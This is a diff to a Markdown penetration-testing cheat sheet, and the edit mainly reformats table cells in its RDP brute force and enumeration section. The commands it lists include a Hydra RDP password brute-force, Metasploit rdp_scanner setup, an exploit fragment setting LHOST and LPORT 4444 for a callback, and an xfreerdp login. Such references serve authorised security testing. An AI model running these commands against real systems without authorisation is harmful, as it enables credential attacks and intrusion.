@@ -209,16 +209,9 @@ exploit
 
 ### RDP Brute Force and Enumeration
 
-| Task / Step                          | Command / Syntax |
-| ------------------------------------ | ---------------- |
-| **Brute‑force RDP login with Hydra** | \`\`\`bash       |
-| hydra -L /path/to/userlist.txt \\    |                  |
-
-```
- -P /path/to/passwordlist.txt \
- rdp://[TARGET] -s [PORT]
-```
-
+| Task / Step                          | Command |
+| ------------------------------------ | ------- |
+| **Brute‑force RDP login with Hydra** | `hydra -L /path/to/userlist.txt -P /path/to/passwordlist.txt rdp://[TARGET] -s [PORT]` |
 | **Use RDP Scanner (check RDP enabled)** | ```bash
 use auxiliary/scanner/rdp/rdp_scanner
 set RHOSTS [TARGET]
@@ -239,9 +232,8 @@ set LHOST [YOUR-IP]
 set LPORT 4444
 exploit
 ``` |
-| **Connect using xfreerdp** | ```bash
-xfreerdp /u:[USERNAME] /p:[PASSWORD] /v:[TARGET]:[PORT]
-``` |
+| **Connect using xfreerdp** | `xfreerdp /u:[USERNAME] /p:[PASSWORD] /v:[TARGET]:[PORT]` |
+
 
 ---
 
